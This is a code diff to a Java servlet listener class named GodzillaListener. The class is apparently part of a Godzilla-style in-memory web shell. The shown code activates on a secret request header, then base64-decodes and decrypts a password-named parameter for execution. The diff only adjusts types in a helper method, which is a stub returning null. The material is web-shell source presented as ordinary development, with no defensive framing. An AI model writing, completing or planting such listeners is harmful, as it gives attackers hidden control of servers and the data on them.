@@ -90,7 +90,7 @@ public class GodzillaListener extends ClassLoader implements ServletRequestListe
         try {
             if (request.getHeader(headerName) != null
                     && request.getHeader(headerName).contains(headerValue)) {
-                HttpServletResponse response = this.getResponseFromRequest(request);
+                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                 HttpSession session = request.getSession();
                 byte[] data = base64Decode(request.getParameter(pass));
                 data = this.x(data, false);
@@ -115,7 +115,7 @@ public class GodzillaListener extends ClassLoader implements ServletRequestListe
         }
     }
 
-    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
+    private Object getResponseFromRequest(Object request) throws Exception {
         return null;
     }
 }
